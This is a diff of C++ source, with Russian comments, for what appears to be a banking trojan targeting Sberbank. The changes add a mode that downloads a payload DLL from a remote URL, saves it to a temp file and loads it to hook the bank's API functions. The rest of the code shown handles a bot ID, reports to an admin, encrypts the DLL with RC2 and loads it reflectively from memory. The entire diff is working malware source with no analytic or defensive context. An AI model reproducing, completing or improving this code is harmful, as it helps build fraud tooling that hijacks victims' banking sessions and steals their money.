@@ -32,6 +32,9 @@ namespace SBER_DOWNLOAD_DLL
 
 static char SBER_HOSTS[SBERHOSTS_PARAM_SIZE] = SBERHOSTS_PARAM_NAME;
 
+//если DLL_FROM_DISK есть, то s.dll загружается на диск и запускается с диска
+#define DLL_FROM_DISK
+
 namespace Sber
 {
 
@@ -96,7 +99,8 @@ static PCHAR GetNameDll(char* uid)
 	{
 		pGetTempPathA( MAX_PATH, path );
 		pPathAppendA( path, uid );
-		char* path2 = UIDCrypt::CryptFileName( path, true );
+		m_lstrcat( path, ".tmp" );
+		char* path2 = UIDCrypt::CryptFileName( path, false );
 		DBG( "Sber", "имя файла dll: %s", path2 );
 		HEAP::Free(path);
 		path = path2;
@@ -137,7 +141,12 @@ static DWORD WINAPI SendLogToAdminThread( LPVOID num )
 	return 0;
 }
 
+//если есть DLL_FROM_DISK, то функция возвращает имя файла
+#ifdef DLL_FROM_DISK
+static char* LoadSluiceDll( char* uid )
+#else
 static BYTE* LoadSluiceDll( char* uid )
+#endif
 {
 	char url[128];
 	fwsprintfA pwsprintfA = Get_wsprintfA();
@@ -155,6 +164,11 @@ static BYTE* LoadSluiceDll( char* uid )
 		DBG( "Sber", "не удаеться скачать нужную длл, проверьте есть ли она по адресу %s", url );
 		if( nameFile )
 		{
+#ifdef DLL_FROM_DISK
+			if( File::IsExists(nameFile) )
+				return nameFile;
+			return 0;
+#else
 			DWORD sz;
 			char* data = (char*)File::ReadToBufferA( nameFile, sz );
 			if( RC2Crypt::Decode( psw, data, sz ) )
@@ -164,6 +178,7 @@ static BYTE* LoadSluiceDll( char* uid )
 				MemFree(data);
 				module = 0;
 			}
+#endif
 		}
 		else
 			return 0;
@@ -175,17 +190,35 @@ static BYTE* LoadSluiceDll( char* uid )
 		DBG( "Sber", "Загружен файл %s, размер: %d", url, szModule );
 		if( nameFile )
 		{
+#ifdef DLL_FROM_DISK
+			File::WriteBufferA( nameFile, module, szModule );
+#else
 			char* data = RC2Crypt::Encode( module, szModule, psw );
 			File::WriteBufferA( nameFile, data, szModule );
 			STR::Free(data);
+#endif
 		}
 	}
+#ifdef DLL_FROM_DISK
+	return nameFile;
+#else
+	STR::Free(nameFile);
 	return module;
+#endif
 }
 
+#ifdef DLL_FROM_DISK
+static bool TranslateHook( HMODULE dll, PInitFunc InitFunc, const char* nameDllFunc, const char* nameHookFunc, int numHookDll, DWORD hashHookFunc, void* realFunc )
+#else
 static bool TranslateHook( HMEMORYMODULE dll, PInitFunc InitFunc, const char* nameDllFunc, const char* nameHookFunc, int numHookDll, DWORD hashHookFunc, void* realFunc )
+#endif
 {
+#ifdef DLL_FROM_DISK
+	void* addrFunc = pGetProcAddress( dll, nameDllFunc );
+#else
 	void* addrFunc = MemoryGetProcAddress( dll, nameDllFunc );
+#endif
+
 	if( !addrFunc )
 	{
 		DBG( "Sber", "в dll нет функции %s", nameDllFunc );
@@ -207,31 +240,51 @@ static bool HookSberApi()
 {
 	DBG( "Sber", "UID: %s", BOT_UID );
 
+#ifdef DLL_FROM_DISK
+	char* nameFile = (char*)LoadSluiceDll(BOT_UID);
+	if( nameFile == 0 ) return false;
+#else
 	BYTE* BotModule = LoadSluiceDll(BOT_UID);
 	if( BotModule == 0 ) return false;
+#endif
 	SendLogToAdmin(2);
 	
+#ifdef DLL_FROM_DISK
+	HMODULE hLib = (HMODULE)pLoadLibraryA(nameFile);
+	int err = pGetLastError();
+	STR::Free(nameFile);
+#else
 	HMEMORYMODULE hLib = MemoryLoadLibrary(BotModule);
+	int err = 0;
+#endif
 	if( hLib == NULL )
 	{	
-		DBG( "Sber", "не получилось загрузить библиотеку (MemoryLoadLibrary)" );
+		DBG( "Sber", "не получилось загрузить библиотеку (MemoryLoadLibrary) err=%d", err );
 		return false;
 	}
 	DBG( "Sber", "Библиотека загружена" );
 
 	char StartInitFunc_func[] = {'I','n','i','t','F','u','n','c',0};
 
+#ifdef DLL_FROM_DISK
+	PInitFunc pInitFunc = (PInitFunc)pGetProcAddress( hLib, StartInitFunc_func );
+#else
 	PInitFunc pInitFunc = (PInitFunc)MemoryGetProcAddress( hLib, StartInitFunc_func );
+#endif
 	if( pInitFunc == NULL )
 	{	
-		DBG( "Sber","в dll нет функции s%", StartInitFunc_func );
+		DBG( "Sber","в dll нет функции %s", StartInitFunc_func );
 		return 0;
 	}
 
+#ifdef DLL_FROM_DISK
+	PSetParams SetParamsSBR = (PSetParams)pGetProcAddress( hLib, "SetParams" );
+#else
 	PSetParams SetParamsSBR = (PSetParams)MemoryGetProcAddress( hLib, "SetParams" );
+#endif
 	if( SetParamsSBR == NULL )
 	{
-		DBG( "Sber", "в dll нет функции s%", StartInitFunc_func );
+		DBG( "Sber", "в dll нет функции SetParams" );
 		return 0;		
 	}
 	
